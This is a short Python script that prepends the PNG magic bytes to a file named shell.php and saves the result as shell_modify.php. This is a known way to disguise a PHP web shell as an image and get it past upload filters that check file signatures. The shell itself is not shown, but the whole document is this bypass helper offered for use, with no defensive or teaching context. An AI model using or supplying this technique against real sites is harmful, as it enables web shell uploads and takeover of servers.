header_png = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'

body = open("shell.php","rb").read()
body_modify = header_png + body

file = open("shell_modify.php","wb")
file.write(body_modify)
file.close()

